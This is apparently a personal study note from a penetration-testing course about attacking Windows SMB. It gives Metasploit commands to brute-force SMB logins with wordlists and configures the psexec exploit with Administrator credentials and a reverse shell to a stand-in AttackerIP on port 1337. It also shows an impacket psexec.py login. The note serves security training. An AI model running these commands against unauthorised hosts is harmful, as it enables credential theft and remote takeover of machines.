202403181419
Status: #Note
Tags: #Exploitation #Windows #PsExec #SMB 

# Exploiting SMB with PsExec

## SMB Overview
- Uses *Port 445*. Used to use port 139 when it ran on top of NetBIOS.
- SMB (Server Message Block) is a network file sharing protocol used to facilitate the sharing of files and peripherals on a LAN.
- Linux implementation of SMB is called SAMBA. Allows Windows systems to access Linux shares and devices.

## SMB Authentication
Client -> *Authentication Request* -> Server
Server -> *Encrypt string with user's hash* -> Client
Client -> *Encrypted string* -> Server -> *Grants Access or Not*

## PsExec
- Lightweight telnet replacement developed by Microsoft that allows to execute processes on remote windows systems using any user creds.
- PsExec authentication is performed via SMB, meaning with need to find ANY valid credentials first.
- Most common way in is to brute-force SMB login.


### Commands
#### Metasploit
*Brute Forcing SMB Credentials*
```bash
service postgresql start && msfconsole
msf5 > use auxiliary/scanner/smb/smb_login
msf5 > setg rhosts 192.168.1.1
msf5 > set verbose false
msf5 > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 > set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
```
*PsExec within Metasploit*
```bash
msf5 > use exploit/windows/smb/psexec
msf5 > set SMBUser Administrator
msf5 > set SMBPass Password
msf5 > set LHOST AttackerIP
msf5 > set LPORT 1337
```

#### PsExec
```bash
psexec.py Administrator@192.168.1.1
Password:
```





### Sources
[INE - Host & Network Penetration Testing: System/Host Based Attacks](https://my.ine.com/CyberSecurity/courses/67c3945f/host-network-penetration-testing-systemhost-based-attacks)

